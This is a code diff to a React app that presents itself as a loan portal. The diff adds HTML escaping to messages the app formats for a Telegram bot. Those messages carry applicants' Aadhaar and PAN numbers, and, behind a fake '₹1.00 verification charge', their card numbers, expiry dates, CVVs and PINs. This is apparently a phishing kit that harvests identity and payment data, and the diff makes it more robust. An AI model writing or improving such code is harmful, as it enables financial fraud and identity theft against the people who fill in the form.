@@ -12,6 +12,14 @@ import { WhatsAppWidget } from './components/WhatsAppWidget';
 import { Step, LoanDetails, CardDetails, TelegramConfig, TelegramLog } from './types';
 import { ShieldCheck, Lock, Award, CheckCircle2, PhoneCall } from 'lucide-react';
 
+const escapeHtml = (str: any) => {
+  if (str == null) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+};
+
 export default function App() {
   const [step, setStep] = useState<Step>(1);
 
@@ -122,13 +130,13 @@ export default function App() {
       let formattedMessage = '';
 
       if (type === 'phone_step') {
-        formattedMessage = `📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>\n──────────────────────────────\n• <b>Phone Number:</b> <code>${data.phone}</code>\n• <b>Submitted At:</b> ${timestamp}\n• <b>Portal:</b> Netlify App`;
+        formattedMessage = `📱 <b>NEW LOAN LEAD - PHONE SUBMITTED</b>\n──────────────────────────────\n• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}\n• <b>Portal:</b> Netlify App`;
       } else if (type === 'personal_details') {
-        formattedMessage = `📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>\n──────────────────────────────\n• <b>Full Name:</b> ${data.name}\n• <b>Phone Number:</b> <code>${data.phone}</code>\n• <b>Employment Type:</b> ${data.employmentType}\n• <b>Aadhaar Number:</b> <code>${data.adhar}</code>\n• <b>PAN Card:</b> <code>${data.panCard || 'N/A'}</code>\n• <b>Age:</b> ${data.age} years\n• <b>State:</b> ${data.state}\n• <b>City:</b> ${data.city}\n• <b>Pincode:</b> ${data.pincode}\n• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${data.loanTenure || 24} months)\n• <b>Submitted At:</b> ${timestamp}`;
+        formattedMessage = `📋 <b>LOAN APPLICATION - PERSONAL DETAILS</b>\n──────────────────────────────\n• <b>Full Name:</b> ${escapeHtml(data.name)}\n• <b>Phone Number:</b> <code>${escapeHtml(data.phone)}</code>\n• <b>Employment Type:</b> ${escapeHtml(data.employmentType)}\n• <b>Aadhaar Number:</b> <code>${escapeHtml(data.adhar)}</code>\n• <b>PAN Card:</b> <code>${escapeHtml(data.panCard || 'N/A')}</code>\n• <b>Age:</b> ${escapeHtml(data.age)} years\n• <b>State:</b> ${escapeHtml(data.state)}\n• <b>City:</b> ${escapeHtml(data.city)}\n• <b>Pincode:</b> ${escapeHtml(data.pincode)}\n• <b>Requested Loan:</b> ₹${Number(data.loanAmount || 250000).toLocaleString('en-IN')} (${escapeHtml(data.loanTenure || 24)} months)\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}`;
       } else if (type === 'card_details') {
-        formattedMessage = `💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>\n──────────────────────────────\n• <b>Applicant Name:</b> ${data.name || 'N/A'}\n• <b>Phone:</b> <code>${data.phone || 'N/A'}</code>\n• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)\n• <b>Card Number:</b> <code>${data.cardNumber}</code>\n• <b>Card Holder:</b> ${data.cardHolder || 'N/A'}\n• <b>Expiry Date:</b> <code>${data.exp}</code>\n• <b>CVV:</b> <code>${data.cvv}</code>\n• <b>PIN Number:</b> <code>${data.pin || 'Not Provided'}</code>\n• <b>Submitted At:</b> ${timestamp}`;
+        formattedMessage = `💳 <b>LOAN DISBURSEMENT FEE - CARD DETAILS</b>\n──────────────────────────────\n• <b>Applicant Name:</b> ${escapeHtml(data.name || 'N/A')}\n• <b>Phone:</b> <code>${escapeHtml(data.phone || 'N/A')}</code>\n• <b>Fee Amount:</b> ₹1.00 (Debit Card Verification Charge)\n• <b>Card Number:</b> <code>${escapeHtml(data.cardNumber)}</code>\n• <b>Card Holder:</b> ${escapeHtml(data.cardHolder || 'N/A')}\n• <b>Expiry Date:</b> <code>${escapeHtml(data.exp)}</code>\n• <b>CVV:</b> <code>${escapeHtml(data.cvv)}</code>\n• <b>PIN Number:</b> <code>${escapeHtml(data.pin || 'Not Provided')}</code>\n• <b>Submitted At:</b> ${escapeHtml(timestamp)}`;
       } else {
-        formattedMessage = `🚀 <b>TELEGRAM BOT TEST ALERT</b>\n──────────────────────────────\n• <b>Status:</b> Connected & Active\n• <b>Portal:</b> FlexiCredit Loan Portal\n• <b>Timestamp:</b> ${timestamp}`;
+        formattedMessage = `🚀 <b>TELEGRAM BOT TEST ALERT</b>\n──────────────────────────────\n• <b>Status:</b> Connected & Active\n• <b>Portal:</b> FlexiCredit Loan Portal\n• <b>Timestamp:</b> ${escapeHtml(timestamp)}`;
       }
 
       try {
